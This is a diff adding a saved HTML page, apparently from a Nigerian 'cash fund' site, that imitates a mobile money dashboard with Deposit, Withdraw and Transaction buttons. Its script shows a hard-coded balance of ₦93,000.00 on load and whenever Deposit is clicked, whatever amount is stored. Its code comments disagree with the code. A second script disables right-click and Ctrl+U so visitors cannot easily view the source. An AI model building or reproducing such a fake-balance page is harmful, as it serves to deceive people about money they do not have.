@@ -1,0 +1,210 @@
+
+<!-- saved from url=(0048)https://cashgramfund.com.ng/FAST%20PAY/home.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><script>
+    
+    </script>
+    
+    
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Home</title>
+        <link href="./Home_files/css2" rel="stylesheet">
+    </head>
+    <body>
+        <style>
+            * {
+                padding: 0;
+                margin: 0;
+                font-family: "Poppins", sans-serif;
+            }
+            body {
+                text-decoration: none;
+                /* color: white; */
+            }
+            a {
+                text-decoration: none;
+                color: rgb(0, 0, 0);  
+            }
+            .top {
+                width: 100%;
+                height: 70px;
+                position: fixed;
+                top: 0;
+                background: #ffffff;
+            }
+            .top img {
+                width: 50px;
+                height: 50px;
+                margin-left: 10px;
+                margin-top: 10px;
+                border-radius: 50%;
+                border: 2px solid grey;
+            }
+            .top h2 {
+                position: relative;
+                padding-left: 76px;
+                margin-top: -47px;
+            }
+            .dash {
+                width: 95%;
+                height: 90px;
+                margin: 0 auto;
+                background: rgb(245, 100, 35);
+                margin-top: 24%;
+                border-top-left-radius: 10px;
+                border-top-right-radius: 10px;
+            }
+            .dash p {
+                padding-left: 10px;
+                padding-top: 10px;
+                color: white;
+            }
+            .dash h2 {
+                padding-left: 10px;
+                color: white;
+                font-size: 29px;
+            }
+            .dash span {
+                font-size: 17px;
+            }
+            .down {
+                display: flex;
+                justify-content: space-around;
+                width: 95%;
+                height: 90px;
+                margin: 0 auto;
+                background: rgb(209, 227, 209);
+                border-bottom-left-radius: 10px;
+                border-bottom-right-radius: 10px;
+            }
+            .small {
+                width: calc(33.33% - 20px);
+                height: 70px;
+                background: #fff;
+                border: 1px solid #000;
+                border-radius: 10px;
+                margin: 10px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-weight: bold;
+                cursor: pointer;
+            }
+            .all {
+                width: 95%;
+                height: 90px;
+                margin: 0 auto;
+                margin-top: 9%;
+                border-top-left-radius: 10px;
+                border-top-right-radius: 10px;  
+            }
+            .all img {
+                width: 100%;
+            }
+            .foot {
+                width: 100%;
+                height: 70px;
+                /* background: #00/0; */
+                position: fixed;
+                bottom: 0;
+            }
+            .foot img  {
+                width: 100%;
+                height: 90px;
+              
+            }
+            
+        </style>
+        <div class="top">
+            <img src="./Home_files/logooo.jpg" alt="">
+            <h2>Hi, User</h2>
+            <div class="notf">
+                <img style="float: right; margin-top: -47px; margin-right: 10px; border: none ; width: 70px;" src="./Home_files/360_F_198336329_D3JsfuSGm5UBTXR9fwcr2WhKNebr7SiB.jpg" alt="">
+            </div>
+        </div>
+        <div class="dash">
+            <p>Available Balance</p>
+            <h2><span style="font-size: 28px;" id="balance">'₦0.00</span></h2>
+        </div>
+        <div class="down">
+            <div class="small" onclick="increaseBalance()">Deposit</div>
+            <div class="small"><a href="Withdraw1.html">Withdraw</a></div>
+            <div class="small"><a href="Transactions.html">Transaction</a></div>
+          
+        </div>
+        <div class="all">
+            <img src="./Home_files/d.jpeg" alt="">
+        </div>
+        <button id="clearStorageButton"></button>
+        <div class="foot">
+            <img src="./Home_files/down.jpeg" alt="">
+        </div>
+        <script>
+             // Function to clear local storage
+        function clearLocalStorage() {
+          localStorage.clear();
+          alert("Local storage cleared!");
+        }
+    
+        // Add event listener to the button
+        document.getElementById('clearStorageButton').addEventListener('click', clearLocalStorage);
+     
+            // Function to increase balance
+            function increaseBalance() {
+                // Retrieve the current balance from local storage
+                var currentBalance = parseFloat(localStorage.getItem('balance')) || 0.00;
+                var currentExpiry = parseFloat(localStorage.getItem('balanceExpiry')) || 0;
+    
+                // Check if balance has expired
+                if (currentExpiry < Date.now()) {
+                    // Balance has expired, reset to 0
+                    currentBalance = 0.00;
+                }
+    
+                // Increase the balance by 45000.00 (&#8358;45000.00) if not exceeding 45000.00
+                var newBalance = Math.min(currentBalance + 65000.00, 65000.00);
+    
+                // Update the balance displayed on the page
+                document.getElementById('balance').innerText =  '₦93,000.00';
+    
+                // Store the new balance in local storage with a 24-hour expiry time
+                localStorage.setItem('balance', newBalance);
+                localStorage.setItem('balanceExpiry', Date.now() + 24 * 60 * 60 * 1000);
+            }
+    
+            // Initialize balance on page load
+            window.onload = function() {
+                // Retrieve the current balance from local storage
+                var currentBalance = parseFloat(localStorage.getItem('balance')) || 0.00;
+                var currentExpiry = parseFloat(localStorage.getItem('balanceExpiry')) || 0;
+    
+                // Check if balance has expired
+                if (currentExpiry < Date.now()) {
+                    // Balance has expired, reset to 0
+                    currentBalance = 0.00;
+                }
+    
+                // Update the balance displayed on the page
+                document.getElementById('balance').innerText = '₦93,000.00';
+            };
+        </script>
+      <script>
+        
+        window.onload = function() {
+            
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+        
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && e.key === 'u') {
+                    e.preventDefault();
+                }
+            });
+        }
+        </script>
+    
+    
+        
+   
+    </body></html>
